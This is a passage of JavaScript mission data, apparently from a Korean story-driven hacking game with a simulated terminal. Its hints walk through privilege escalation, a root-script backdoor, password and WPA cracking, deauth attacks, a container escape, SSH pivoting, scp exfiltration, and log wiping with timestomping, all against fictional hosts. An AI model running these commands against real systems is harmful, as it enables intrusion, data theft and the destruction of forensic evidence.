          fs: { 'note.txt': f('note.txt', '내부망 진입 성공. 다음은 권한 상승.', 'rw-r--r--', 'www-data') }
        });
        g.sshOk = false; g.onSshSuccess = () => { g.sshOk = true; };
      },
      check(g) { return g.sshOk; },
      success: '0xMOTHER> 리버스 셸 성립. HELIOS 내부망에 첫 발을 들였다. 외벽 안쪽이야 — 여기서부턴 진짜 그들의 영토다.'
    },
    {
      id: 'S2.08', tier: '중급', title: '낯선 목소리',
      brief: [
        '0xMOTHER> 내부 셸은 잡았다. www-data 권한이라 아직 낮지만 — 거점은 거점이야. 잠깐 숨을 골라.',
        '0xMOTHER> …잠깐. 이 채널은 나랑 너밖에 모르는데. 누가… 끼어든다.'
      ].join('\n'),
      incoming: {
        from: 'wraith',
        head: '[ 미식별 채널이 강제로 열렸다 — 역추적 실패 ]',
        lines: [
          '(지직…) 꽤 하잖아? 근데 그렇게 느리고 고지식하게 굴면 결국 사냥개에게 물어뜯겨.',
          '안녕, 신입. /tmp 에 선물 하나 뒀어. 실행은 하지 말고, 읽기만 해봐.'
        ],
        foot: '[ 채널 종료 · 연락처에 WRAITH 추가됨 — `channel wraith` ]'
      },
      objective: 'WRAITH가 남긴 선물의 내용을 확인하라. 실행은 신뢰가 아니다.',
      goal: 'WRAITH가 /tmp 에 남긴 정체불명의 스크립트를, 절대 실행하지 않고 내용만 열어 그 진짜 의도를 파악하는 것이 목표다. 공짜 선물에 숨겨진 갈고리를 알아채는 의심 — 그것이 이 미션의 진짜 시험이다.',
      hints: ['`ls -l /tmp/gift.sh` 로 정체 확인', '`cat /tmp/gift.sh` 로 내용을 먼저 본다', '실행은 하지 마라 — 공짜엔 갈고리가 있다'],
      setup(g) {
        g.fs = world({}, (root) => { root.children.tmp.children['gift.sh'] = f('gift.sh', '#!/bin/sh\n# WRAITH: 권한상승 자동화 — 단, 백도어도 함께 심는다\nfind / -perm -4000 2>/dev/null', 'rwxr-xr-x', 'wraith'); });
        g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'helios-internal';
      },
      check(g) { return g.readFiles && g.readFiles.has('/tmp/gift.sh'); },
      success: '0xMOTHER> 읽기만 했지? 잘했어. 그자 — WRAITH다. 믿지 마. 그렇다고 무시도 하지 마. 앞으로 네 귀에 대고 계속 속삭일 테니.'
    },

    /* ═══════════ SERIES 3 — 그림자 전쟁 (고급) ═══════════ */
    {
      id: 'S3.01', tier: '고급', title: '권한의 벽',
      interlude: [
        '╔═══ SERIES 3 · 그림자 전쟁 ═══╗',
        'ORACLE> 침입자 행동 패턴 학습 중. 역추적 34%.',
        '0xMOTHER> WRAITH 말은 흘려들어. www-data 권한으론 아무것도 못 해 — 합법적인 사다리를 찾아 root 까지 올라가야 한다.'
      ].join('\n'),
      brief: [
        '0xMOTHER> 권한 상승의 정석은 *시스템이 스스로 내준 사다리*를 찾는 거야.',
        '0xMOTHER> SUID 비트가 걸린 파일은 누가 실행하든 그 파일 소유자(보통 root) 권한으로 돈다. 정상 시스템 도구엔 정당하게 붙지만, 누군가 실수로 엉뚱한 바이너리에 걸어두면 그게 곧 뒷계단이야.',
        '0xMOTHER> `find / -perm -4000 2>/dev/null` 으로 SUID 바이너리를 전부 사냥하고, 그중 *수상한 비표준* 하나를 찾아.'
      ].join('\n'),
      objective: 'SUID 비트가 선 비표준 바이너리를 찾아 그 경로를 submit 하라.',
      goal: '낮은 권한에서 벗어날 사다리를 찾는 것이 목표다. 시스템 전체를 뒤져 root 권한으로 실행되도록 잘못 설정된(SUID) 비표준 바이너리 하나를 찾아 그 경로를 제출한다. 표준 도구들 사이에 숨은, 있어서는 안 될 그 하나를 가려내는 안목이 핵심이다.',
      hints: ['`find / -perm -4000 2>/dev/null`', '비표준 이름(예: /usr/bin/runner)을 주목', 'submit /usr/bin/runner'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'helios-internal';
        g.suidFiles = ['/usr/bin/passwd', '/bin/su', '/usr/bin/runner'];
      },
      check(g) { return g.submitted && g.submitted.has('/usr/bin/runner'); },
      success: '0xMOTHER> /usr/bin/runner — 비표준 SUID. 누군가의 게으른 설정이 너에게 사다리를 내줬다. 저게 네 길이야.'
    },
    {
      id: 'S3.02', tier: '고급', title: '두 갈래 길',
      brief: [
        'WRAITH> 그 구식 방법으로 언제 루트 달아? 매분 root 로 도는 헬스체크 스크립트에 한 줄만 덧붙이면 끝이야.',
        'WRAITH> 전 단계에서 찍은 사다리는 /usr/bin/runner 였지. 까먹었다면 거기서부터 다시 보면 돼.',
        "WRAITH> `echo \"/bin/bash -p\" >> /opt/health.sh` — 더럽지만 1초면 돼. 효율이 곧 생존이지.",
        '0xMOTHER> 지름길은 흔적을 남겨. runner 바이너리 안에 root 비번이 박혀 있다(`strings`). 그걸 읽어 정공법으로 `su root` 해라.',
        '[ 두 길이 갈린다 — 어느 쪽을 택하느냐가 네 성향(STANCE)을 정한다 ]'
      ].join('\n'),
      objective: 'root 권한을 획득하라. 선택한 방식이 성향에 반영된다.',
      goal: 'root 권한을 손에 넣는 것이 목표다. 단, 길은 둘이다 — 바이너리 속에 박힌 비밀번호를 읽어 정정당당히 승격하는 0xMOTHER의 정공법(신념), 혹은 root 로 도는 스크립트에 백도어 한 줄을 심는 WRAITH의 지름길(효율). 어느 쪽을 택하든 root 가 되지만, 그 선택이 너라는 해커를 정의한다.',
      hints: [
        '(WRAITH) `echo "/bin/bash -p" >> /opt/health.sh`',
        '(0xMOTHER) `strings /usr/bin/runner` 로 root 비번을 찾아 `su root <비번>`',
        '둘 중 하나면 클리어 — 선택이 성향(STANCE)을 가른다'
      ],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'helios-internal';
        g.passwords = { root: 'Pr0per_R00t!' };
        g.fs = world({}, (root) => {
          root.children.opt.children['health.sh'] = f('health.sh', '#!/bin/sh\n# runs every minute as root\nuptime\n', 'rwxrwxrwx', 'root');
          root.children.usr.children.bin.children['runner'] = f('runner', '\x7fELF...binary...\nROOT_PW=Pr0per_R00t!\n..more bytes..', 'rwsr-xr-x', 'root');
        });
      },
      check(g) {
        const h = g.fs.getNode('/opt/health.sh');
        return g.user === 'root' || !!(h && /\/bin\/bash -p/.test(h.content));
      },
      stance(g) { return g.user === 'root' ? 'creed' : 'ghost'; },
      success: '0xMOTHER> 결국 루트를 따냈군. 어떻게 땄는지 — 그게 네가 어떤 해커인지 말해준다. 난 봤다, 네 선택을.'
    },
    {
      id: 'S3.03', tier: '고급', title: '루트 탈취',
      brief: [
        '0xMOTHER> root 다. 이제 이 시스템에서 네가 못 여는 문은 없어. 진짜 목표를 찾을 시간이야.',
        '0xMOTHER> HELIOS 코어를 지키는 인증 데몬 — helios_auth_daemon — 이 이 호스트 어딘가에서 돌고 있다. 그게 왕국의 자물쇠야.',
        '0xMOTHER> `find / -name helios_auth_daemon` 으로 그 위치를 짚어내.'
      ].join('\n'),
      objective: 'root 권한으로 코어 인증 데몬의 전체 경로를 찾아 submit 하라.',
      goal: 'root 권한을 손에 쥔 지금, HELIOS 코어를 지키는 핵심 인증 데몬(helios_auth_daemon)이 시스템 어디에 숨어 있는지 그 정확한 전체 경로를 찾아 제출하는 것이 목표다. 왕국의 자물쇠가 놓인 위치를 먼저 알아야, 그 안으로 들어갈 수 있다.',
      hints: ['`find / -name helios_auth_daemon`', '결과 경로를 그대로 submit', 'submit /opt/core/helios_auth_daemon'],
      setup(g) {
        g.cwd = '/root'; g.user = 'root'; g.host = 'helios-internal';
        g.fs = world({}, (root) => {
          root.children.root = dir('root', 'rwx------', 'root', {});
          root.children.opt.children.core = dir('core', 'rwxr-xr-x', 'root', {
            'helios_auth_daemon': f('helios_auth_daemon', 'binary', 'rwxr-xr-x', 'root')
          });
        });
      },
      check(g) { return g.submitted && g.submitted.has('/opt/core/helios_auth_daemon'); },
      success: '0xMOTHER> 코어 인증 데몬. 이 안에 들어가면 — 왕국의 열쇠다. 거의 다 왔어.'
    },
    {
      id: 'S3.04', tier: '고급', title: '하드코딩',
      brief: [
        '0xMOTHER> 인증 데몬의 암호 프로토콜은 직접 깨기엔 너무 복잡해. 하지만 개발자는 늘 게으르지.',
        '0xMOTHER> 전 단계에서 찾은 대상은 /opt/core/helios_auth_daemon 이다. 이 미션만 다시 들어왔어도 그 경로에서 시작하면 된다.',
        '0xMOTHER> 그들은 편하려고 마스터 키 같은 비밀을 코드 안에 *그냥 문자열로* 박아두곤 해. 컴파일된 바이너리에도 그 글자들은 그대로 남아 있어.',
        '0xMOTHER> `strings` 는 바이너리에서 사람이 읽을 수 있는 문자열만 뽑아내. 거기서 MASTER_KEY 를 캐내라.'
      ].join('\n'),
      objective: '하드코딩된 마스터 키(MASTER_KEY=값)를 추출해 submit 하라.',
      goal: '직접 깨기엔 너무 복잡한 인증 데몬에서, 개발자가 게으르게 코드 안에 박아둔 마스터 키 문자열을 뽑아내 제출하는 것이 목표다. 암호를 정면으로 부수는 대신, 사람의 게으름이 남긴 평문 비밀을 노린다.',
      hints: ['`strings /opt/core/helios_auth_daemon`', 'MASTER_KEY= 뒤의 값', 'submit H3lios_M4st3rK3y'],
      setup(g) {
        g.cwd = '/opt/core'; g.user = 'root'; g.host = 'helios-internal';
        g.fs = world({}, (root) => {
          root.children.opt.children.core = dir('core', 'rwxr-xr-x', 'root', {
            'helios_auth_daemon': f('helios_auth_daemon', '\x00\x01ELF\x02bytes\x00libc.so\x00MASTER_KEY=H3lios_M4st3rK3y\x00malloc\x00', 'rwxr-xr-x', 'root')
          });
        });
      },
      check(g) { return g.submitted && g.submitted.has('H3lios_M4st3rK3y'); },
      success: '0xMOTHER> 마스터 키를 바이너리에 박아둔 게으름 — 우리에겐 선물이지. 이제 그들의 금고가 열린다.'
    },
    {
      id: 'S3.05', tier: '고급', title: '비밀의 압축 파일',
      brief: [
        '0xMOTHER> 마스터 키로 연 폴더 안에 거대한 암호화 압축 파일이 있다 — data.zip. 비번이 걸려 있어.',
        '0xMOTHER> 무차별로 풀 순 없지만, 비번은 분명 회사 비밀번호 규정을 따를 거야. 사전 공격이 통한다는 뜻이지.',
        '0xMOTHER> `zip2john` 으로 zip 의 비번 해시를 뽑아내고, `john` 으로 사전(rockyou)을 돌려 크랙해.'
      ].join('\n'),
      objective: '암호화된 압축 파일의 비밀번호를 크랙해 submit 하라.',
      goal: '마스터 키로 열린 폴더 속 암호 압축 파일(data.zip)의 비밀번호를, 회사 규정의 허점을 노린 사전 공격으로 크랙해 제출하는 것이 목표다. 규칙적으로 만든 비밀번호일수록 오히려 더 빨리 무너진다는 역설을 이용한다.',
      hints: ['`zip2john data.zip > hash.txt`', '`john --wordlist=rockyou.txt hash.txt`', '나온 비번을 submit'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'root'; g.host = 'helios-internal';
        const zh = '$zip2$*0*helios*deadbeef';
        g.fs = world({ 'data.zip': Object.assign(f('data.zip', 'PK\x03\x04 encrypted', 'rw-r--r--', 'root'), { ziphash: zh }) });
        g.crackable = {}; g.crackable[zh] = 'Helios#2024';
      },
      check(g) { return (g.cracked && g.cracked.has('Helios#2024')) || (g.submitted && g.submitted.has('Helios#2024')); },
      success: '0xMOTHER> 사전 단어 + 연도 — Helios#2024. 규정대로 만든 비번이라 오히려 더 잘 깨졌군. 규칙은 양날의 검이야.'
    },
    {
      id: 'S3.06', tier: '고급', title: '마트료시카',
      brief: [
        'WRAITH> 또 나야. 이 편집증 관리자, 파일 하나를 형식을 바꿔가며 네 겹이나 압축해뒀어. 인형 속 인형이지.',
        'WRAITH> 무작정 풀려다 도구를 잘못 고르면 깨져. `file` 로 매 겹의 *실제 형식*을 먼저 확인하고, 그에 맞는 해제 도구를 써.',
        'WRAITH> 폭탄 해체하듯 한 겹씩. bz2 → tar → gz 순서로 벗겨내.'
      ].join('\n'),
      objective: '중첩 압축된 데이터를 끝까지 해제하라.',
      goal: '편집증적인 관리자가 형식을 바꿔가며 여러 겹으로 감싼 파일을, 매 겹의 실제 형식을 확인해가며 알맞은 도구로 끝까지 풀어 그 가장 안쪽에 숨은 BLACKLIST 좌표를 드러내는 것이 목표다. 성급함이 아니라 인내가 이 인형을 연다.',
      hints: ['`file payload.bz2` 로 형식 확인', '`bunzip2 payload.bz2` → `tar -xvf payload.tar` → `gunzip payload.gz`', '세 겹을 다 벗기면 완료'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'root'; g.host = 'helios-internal';
        const inner = f('secret.txt', 'BLACKLIST 좌표가 여기 있다.', 'rw-r--r--', 'root');
        const gz = Object.assign(f('payload.gz', 'gz', 'rw-r--r--', 'root'), { archive: 'gz', next: inner });
        const tar = Object.assign(f('payload.tar', 'tar', 'rw-r--r--', 'root'), { archive: 'tar', next: gz });
        const bz2 = Object.assign(f('payload.bz2', 'bz2', 'rw-r--r--', 'root'), { archive: 'bz2', next: tar });
        g.fs = world({ 'payload.bz2': bz2 });
      },
      check(g) { return (g.unwrapped || 0) >= 3; },
      success: '0xMOTHER> 세 겹을 다 벗겼다. 편집증도 인내심 앞에선 소용없지. …WRAITH가 이걸 도왔다는 게 마음에 걸리지만.'
    },
    {
      id: 'S3.07', tier: '고급', title: '보이지 않는 잉크',
      brief: [
        '0xMOTHER> 이상한 파일이 하나 있어. 이름은 cover.jpg 인데 — 이미지 안에 다른 데이터가 숨어 있다.',
        '0xMOTHER> 스테가노그래피야. 암호화와 달리 *존재 자체를 숨기는* 기술이지. 그림의 픽셀 속에 메시지를 몰래 박아 넣는다.',
        '0xMOTHER> `steghide extract -sf cover.jpg` 로 숨은 데이터를 뽑아내. 블랙리스트 DB를 여는 마지막 키가 거기 있다.'
      ].join('\n'),
      objective: '은닉된 데이터에서 블랙리스트 키를 추출해 submit 하라.',
      goal: '겉보기엔 평범한 이미지(cover.jpg) 속에 스테가노그래피로 은닉된 데이터를 추출해, 그 안에 적힌 블랙리스트 DB 키를 밝혀내 제출하는 것이 목표다. 잠긴 것을 푸는 게 아니라, 숨겨진 것이 거기 있다는 사실 자체를 꿰뚫어 본다.',
      hints: ['`steghide extract -sf cover.jpg`', '나온 hidden.txt 를 `cat`', 'KEY= 뒤의 값을 submit'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'root'; g.host = 'helios-internal';
        g.fs = world({ 'cover.jpg': Object.assign(f('cover.jpg', '\xff\xd8\xff JPEG bytes', 'rw-r--r--', 'root'), { stego: 'BLACKLIST_DB_KEY=z3r0_d4y' }) });
      },
      check(g) { return g.stegoExtracted && g.submitted && g.submitted.has('z3r0_d4y'); },
      success: '0xMOTHER> 이미지 속 잉크까지 읽었군. 이제 마지막 상자 — 블랙리스트 DB 를 열 차례다. 각오해. 좋은 게 들어 있진 않아.'
    },
    {
      id: 'S3.08', tier: '고급', title: '판도라의 상자',
      interlude: [
        'WRAITH> 열었군. 이 명단을 봐. 이게 HELIOS 가 추적 중인 사람들의 블랙리스트야.',
        'WRAITH> 거기 0xMOTHER 의 본명과 물리적 위치가 적혀 있어. 그녀는 이미 HELIOS 감시 아래라고.',
        'WRAITH> 모르겠어? 그녀는 처음부터 알고 있었어. 널 장기말로 쓰고, 일이 끝나면 버릴 셈이지. 명단을 *부숴버려* — 너를 위해서.',
        '0xMOTHER> …그래. 사실이야. 내 이름도, 내가 감시당하는 것도. 부정 안 한다.',
        '0xMOTHER> 하지만 그 명단을 부수면 증거도 같이 사라져. 거기 적힌 수백 명을 구할 유일한 증거야. 복사해서 가져와. 날 믿어줘 — 마지막으로 한 번만.'
      ].join('\n'),
      brief: [
        'WRAITH> 파괴해. 흔적도, 그녀의 거짓말도 다 지워: `rm -rf blacklist.db`',
        '0xMOTHER> 보존해. 그 사람들을 위해: `scp blacklist.db me@10.0.0.42:/tmp/`',
        '[ 돌이킬 수 없는 선택 — 신뢰의 향방이 갈린다 ]'
      ].join('\n'),
      objective: '블랙리스트 데이터를 파괴하거나 보존하라. 선택이 엔딩을 가른다.',
      goal: '마침내 연 블랙리스트 명단을 어떻게 할지 결정하는 것이 목표다 — WRAITH의 말대로 영구히 파괴하거나(불신·효율), 0xMOTHER의 부탁대로 우리 거점에 빼돌려 보존하거나(신뢰·신념). 둘 중 하나만 실행하면 미션은 끝나지만, 되돌릴 수 없는 이 한 번의 선택이 너의 엔딩을 가른다.',
      hints: ['(WRAITH/파괴) `rm -rf blacklist.db`', '(0xMOTHER/보존) `scp blacklist.db me@10.0.0.42:/tmp/`', '둘 중 하나면 클리어'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'root'; g.host = 'helios-internal'; g.ip = '10.0.0.42';
        g.fs = world({ 'blacklist.db': f('blacklist.db', 'TARGET: 0xMOTHER (본명: 한지수) · 위치: 구 시가지 4구역 · 상태: 감시중', 'rw-------', 'root') });
      },
      check(g) { const n = g.fs.getNode('/home/guest/blacklist.db'); return !n || (g.exfiltrated && g.exfiltrated.size > 0); },
      stance(g) { return g.fs.getNode('/home/guest/blacklist.db') ? 'creed' : 'ghost'; },
      success: '0xMOTHER> ……선택했군. 다음이 마지막이다. 두 목소리가 처음으로 같은 말을 한다 — 코어를 끝내라고.'
    },

    /* ═══════════ SERIES 4 — 완전한 정전 (실전) ═══════════ */
    {
      id: 'S4.01', tier: '실전', title: '막힌 길',
      interlude: [
        '╔═══ SERIES 4 · 완전한 정전 ═══╗',
        'ORACLE> 외부 침입 경로 차단. 전 네트워크 격리 프로토콜 개시. 역추적 61%.',
        '0xMOTHER> HELIOS가 인터넷 케이블을 통째로 뽑아버렸어. 원격으론 더 못 들어가 — 추적은 이제 물리 세계로 넘어온다.',
        '0xMOTHER> 하지만 코어 반경 50m 안엔 무선 AP가 살아 있다. 직접 그 근처로 가라. 이제 손에 든 건 노트북 하나뿐이야.'
      ].join('\n'),
      brief: [
        '0xMOTHER> 인터넷이 끊겨도 공기는 흐른다. 무선 신호를 잡으려면 먼저 네 무선 카드를 *모니터 모드*로 올려야 해.',
        '0xMOTHER> 평소 무선 카드는 자기 앞으로 온 패킷만 받지만, 모니터 모드는 공기 중 모든 신호를 엿듣게 해줘 — 스니핑의 전제 조건이지.',
        '0xMOTHER> `airmon-ng start wlan0` — 사냥의 준비다.'
      ].join('\n'),
      objective: '무선카드를 모니터 모드로 전환하라.',
      goal: '인터넷이 차단된 상황에서, 무선 카드를 모니터 모드로 전환해 주변 공기 중을 흐르는 모든 무선 신호를 엿들을 수 있는 상태를 갖추는 것이 목표다. 이후의 모든 무선 사냥이 이 한 번의 준비 위에서 시작된다.',
      hints: ['`airmon-ng start wlan0`', '인터페이스가 wlan0mon 으로 바뀌면 완료', '다음은 대기를 스니핑한다'],
      setup(g) { g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'mobile-rig'; },
      check(g) { return g.monitorMode === true; },
      success: '0xMOTHER> 모니터 모드 ON. 이제 대기에 흐르는 모든 신호가 네 것이다. HELIOS는 자기들이 공기까지 막을 수 있다고 믿었겠지.'
    },
    {
      id: 'S4.02', tier: '실전', title: '허공의 신호',
      brief: [
        '0xMOTHER> 모니터 모드를 켰으면 이제 공기를 읽어. `airodump-ng` 가 주변 AP를 실시간으로 훑어준다.',
        '0xMOTHER> 독립 시작이라면 아직 모니터 모드가 아닐 수 있다. 먼저 wlan0 를 wlan0mon 으로 올린 뒤 스캔하면 된다.',
        '0xMOTHER> 화면엔 여러 네트워크가 뜰 거야 — 게스트망, 카페 공유기… 우리가 노리는 건 클라이언트가 붙어 있는 *코어 운영망* WPA2 AP다.',
        '0xMOTHER> 클라이언트가 붙어 있어야 다음 단계(핸드셰이크 캡처)가 가능해. 그 SSID를 찾아라.'
      ].join('\n'),
      objective: '주변 AP에서 HELIOS 코어 운영망의 SSID를 찾아 submit 하라.',
      goal: '주변의 무선 AP들을 스캔해, 미끼와 게스트망을 모두 걸러내고 클라이언트가 실제로 접속해 있는 HELIOS 코어 운영망의 SSID를 정확히 식별해 제출하는 것이 목표다. 사람이 붙어 있는 망이어야만, 다음 단계인 핸드셰이크 포획이 가능하다.',
      hints: ['`airmon-ng start wlan0`', '`airodump-ng wlan0mon`', '클라이언트 붙은 WPA2 AP의 ESSID 를 submit'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'mobile-rig';
        g.wifi = [
          { essid: 'HELIOS-Guest', bssid: 'AA:BB:CC:00:11:01', ch: 6, enc: 'WPA2', clients: 0 },
          { essid: 'HELIOS-CORE-OPS', bssid: 'DE:AD:C0:DE:13:37', ch: 11, enc: 'WPA2', clients: 3, key: 'C0re_Gr1d!' },
          { essid: 'cafe_free', bssid: '11:22:33:44:55:66', ch: 1, enc: 'OPEN', clients: 8 }
        ];
      },
      check(g) { return g.submitted && g.submitted.has('HELIOS-CORE-OPS'); },
      success: '0xMOTHER> HELIOS-CORE-OPS. 클라이언트가 셋이나 붙었군 — 핸드셰이크 잡기 딱 좋다. 사냥감을 찾았어.'
    },
    {
      id: 'S4.03', tier: '실전', title: '악마의 쌍둥이',
      brief: [
        'WRAITH> 핸드셰이크만 잡으면 끝이야. 근데 가만 기다리면 언제 누가 접속하겠어? 강제로 끊어버리면 돼.',
        'WRAITH> 전 단계 표적은 HELIOS-CORE-OPS, BSSID는 DE:AD:C0:DE:13:37 이다. 사전 파일도 작업 폴더에 준비돼 있어.',
        'WRAITH> deauth 패킷은 "너 연결 끊겼어"라고 속이는 거짓 신호야. 내부자를 한 번 떨궈내면, 자동으로 재접속하면서 WPA 핸드셰이크를 흘린다 — 그걸 낚아채.',
        'WRAITH> `aireplay-ng -0 10 -a <BSSID> wlan0mon` 으로 끊고, 캡처한 핸드셰이크를 `aircrack-ng -w` 사전으로 깨.'
      ].join('\n'),
      objective: '핸드셰이크를 캡처하고 코어 운영망의 WPA 키를 크랙해 submit 하라.',
      goal: '내부자의 무선 연결을 강제로 끊어(deauth) 재접속 순간의 WPA 핸드셰이크를 포획하고, 이를 사전 공격으로 크랙해 HELIOS 코어 운영망의 무선 비밀번호를 알아내 제출하는 것이 목표다. 이 키 하나로 물리적으로 격리된 코어 망 안으로 들어선다.',
      hints: ['airmon → airodump 로 BSSID 확인', '`aireplay-ng -0 10 -a DE:AD:C0:DE:13:37 wlan0mon`', '`aircrack-ng -w wordlist.txt capture-01.cap` → KEY submit'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'mobile-rig';
        g.fs = world({ 'wordlist.txt': f('wordlist.txt', 'password\nadmin123\nC0re_Gr1d!\nletmein\nhelios2024\n', 'rw-r--r--', 'guest') });
        g.wifi = [{ essid: 'HELIOS-CORE-OPS', bssid: 'DE:AD:C0:DE:13:37', ch: 11, enc: 'WPA2', clients: 3, key: 'C0re_Gr1d!' }];
      },
      check(g) { return g.submitted && g.submitted.has('C0re_Gr1d!'); },
      success: '0xMOTHER> 무선망 장악. 핸드셰이크 한 번, 사전 한 방 — 물리 보안도 결국 비번 싸움이야. 코어 망 안으로 들어왔다.'
    },
    {
      id: 'S4.04', tier: '실전', title: '보이지 않는 벽',
      brief: [
        '0xMOTHER> 코어에 붙었는데… 뭔가 이상해. 시스템이 너무 깨끗하고 비어 있어. `ls -la /` 를 쳐봐.',
        '0xMOTHER> …`.dockerenv` 가 보이지? 우린 진짜 코어가 아니라 *도커 컨테이너 함정* 안에 갇혔어. 격리된 모래상자야 — 여기서 뭘 부숴도 진짜 시스템엔 안 닿아.',
        '0xMOTHER> 하지만 설정이 허술하면 탈출구가 있어. 호스트의 진짜 디스크를 마운트해서 그 위로 `chroot` 해 빠져나가.'
      ].join('\n'),
      objective: '컨테이너를 탈출해 호스트 환경으로 이동하라.',
      goal: '겉으로는 코어처럼 보이지만 사실은 격리된 도커 컨테이너 함정임을 알아채고, 호스트의 실제 디스크를 끌어와(mount) 그 위로 루트를 옮겨(chroot) 함정 밖 진짜 시스템으로 탈출하는 것이 목표다. 가둬두고 관찰하려는 그들의 덫에서 빠져나온다.',
      hints: ['`ls -la /` 로 .dockerenv 등 흔적 확인', '`mount /dev/sda1 /mnt`', '`chroot /mnt` 로 호스트 탈출'],
      setup(g) {
        g.cwd = '/'; g.user = 'root'; g.host = 'core-container';
        g.dockerTrap = true;
        g.fs = world({}, (root) => { root.children['.dockerenv'] = f('.dockerenv', '', 'rw-r--r--', 'root'); });
      },
      check(g) { return g.dockerEscaped === true; },
      success: '0xMOTHER> 컨테이너 함정 탈출. 그들은 널 모래상자에 가둬 시간을 끌려 했지. 이제 진짜 호스트 위에 섰다.'
    },
    {
      id: 'S4.05', tier: '실전', title: '비밀 터널',
      brief: [
        '0xMOTHER> 호스트엔 섰지만, 진짜 코어 DB는 방화벽으로 분리된 안쪽 망(10.0.0.1)에 있어. 여기선 직접 못 닿아.',
        '0xMOTHER> 점프호스트는 10.0.1.1, 계정은 admin, 비밀번호는 jump_2024 다. 이전 피벗 정보를 여기 다시 적어둔다.',
        '0xMOTHER> 대신 우리가 점령한 이 점프박스를 *징검다리*로 쓴다. SSH 포트 포워딩(-L)은 내 로컬 포트를, 점프박스를 거쳐, 분리망의 목적지까지 잇는 비밀 터널을 뚫어줘.',
        '0xMOTHER> `ssh -L 8080:10.0.0.1:80 admin@10.0.1.1` — 내 8080 포트가 곧 코어 DB의 문이 된다.'
      ].join('\n'),
      objective: 'SSH 포트포워딩으로 분리망의 코어 DB로 가는 터널을 뚫어라.',
      goal: '방화벽으로 분리되어 직접 닿을 수 없는 안쪽의 코어 DB(10.0.0.1)에, 점령한 점프박스를 징검다리 삼은 SSH 터널을 뚫어 도달 경로를 확보하는 것이 목표다. 내 로컬 포트 하나가 곧 방화벽 너머 코어 DB로 들어가는 비밀의 문이 된다.',
      hints: ['점프호스트: admin@10.0.1.1 (비번 jump_2024)', '`ssh -L 8080:10.0.0.1:80 admin@10.0.1.1 jump_2024`', '터널이 열리면 완료'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'root'; g.host = 'core-host'; g.fs = world({});
        g.network = [host('jumpbox', '10.0.1.1', [{ port: 22, service: 'ssh' }], {
          creds: { admin: 'jump_2024' },
          tunnel: { 'http://localhost:8080': '<html>HELIOS CORE DB — 30,000 records</html>' }
        })];
      },
      check(g) { return g.tunnelOpen === true; },
      success: '0xMOTHER> 터널 개통. 방화벽 너머 코어 DB가 손에 닿는다. 3만 건의 기록 — 도시 전체의 사슬이 저 안에 있어.'
    },
    {
      id: 'S4.06', tier: '실전', title: '디지털 세탁',
      brief: [
        '0xMOTHER> 셧다운 전 마지막 정리다. 네가 지나온 모든 발자국이 코어 syslog에 찍혀 있어 — 네 IP, 10.0.0.42.',
        '0xMOTHER> `sed -i` 의 -i 는 "in-place", 즉 파일을 직접 고친다. `/패턴/d` 는 "그 패턴이 든 줄을 삭제"하라는 명령이야.',
        '0xMOTHER> `sed -i \'/10.0.0.42/d\' /var/log/syslog` — 네 흔적을 단 한 줄도 남기지 마.'
      ].join('\n'),
      objective: '로그에서 네 접속 흔적이 찍힌 모든 줄을 삭제하라.',
      goal: '코어를 끝내기 전, 수십만 줄의 시스템 로그(syslog)에서 네 IP(10.0.0.42)가 찍힌 모든 줄을 단 하나도 남김없이 삭제해 침입의 흔적을 지우는 것이 목표다. 정확히 너의 자취만 도려내고 나머지는 그대로 둬, 누구도 무엇이 사라졌는지 눈치채지 못하게 한다.',
      hints: ['`grep 10.0.0.42 /var/log/syslog` 로 확인', "`sed -i '/10.0.0.42/d' /var/log/syslog`", '네 IP가 한 줄도 안 남으면 완료'],
      setup(g) {
        g.cwd = '/'; g.user = 'root'; g.host = 'core-host';
        const lines = [];
        for (let i = 0; i < 40; i++) lines.push(`Jun 27 12:0${i % 10} core sshd: session for helios`);
        lines.splice(12, 0, 'Jun 27 12:03 core auth: login from 10.0.0.42');
        lines.splice(28, 0, 'Jun 27 12:07 core sudo: 10.0.0.42 ran systemctl');
        g.fs = world({}, (root) => { root.children.var.children.log.children.syslog = f('syslog', lines.join('\n'), 'rw-r--r--', 'root'); });
      },
      check(g) { const n = g.fs.getNode('/var/log/syslog'); return !!(n && !/10\.0\.0\.42/.test(n.content)); },
      success: '0xMOTHER> 흔적을 도려냈다. 만약 이게 원격 불변(append-only) 로그였으면 못 지웠을 텐데 — 그들이 로컬에 둔 게 실수야.'
    },
    {
      id: 'S4.07', tier: '실전', title: '시간 조작',
      brief: [
        'WRAITH> 로그만 지운다고 끝이 아니야, 신입. 포렌식 수사관은 줄 내용보다 *시간*을 본다 — 언제 파일이 만져졌는지를.',
        'WRAITH> 대상 로그는 /var/log/syslog 다. 바로 전 세탁 단계에서 손댄 그 파일이라고 생각하면 된다.',
        'WRAITH> 네가 방금 syslog를 수정한 시각이 그대로 메타데이터에 박혀 있어. 그 자체가 증거지.',
        'WRAITH> `touch -t` 로 파일의 수정 시간을 한참 과거로 돌려놔. 시간을 뒤틀면 수사관은 유령을 쫓게 돼.'
      ].join('\n'),
      objective: '로그의 타임스탬프를 과거로 변조하라.',
      goal: '로그 내용을 지운 것만으로는 부족하다. 포렌식이 추적하는 파일의 수정 시각 자체를 한참 과거로 되돌려, 방금 손댄 흔적마저 시간 속에 묻어버리는 것이 목표다. 무엇을 지웠는지가 아니라, 언제 건드렸는지조차 거짓으로 만든다.',
      hints: ['`touch -t 202501010000 /var/log/syslog`', 'YYYYMMDDhhmm 형식', '시간이 바뀌면 완료'],
      setup(g) {
        g.cwd = '/'; g.user = 'root'; g.host = 'core-host';
        g.fs = world({}, (root) => { root.children.var.children.log.children.syslog = f('syslog', 'cleaned log', 'rw-r--r--', 'root'); });
      },
      check(g) { return !!g.timestomped; },
      success: '0xMOTHER> 타임라인을 뒤틀었다. 이제 그들의 포렌식은 유령을 쫓겠지. …WRAITH가 이런 건 확실히 잘 알아.'
    },
    {
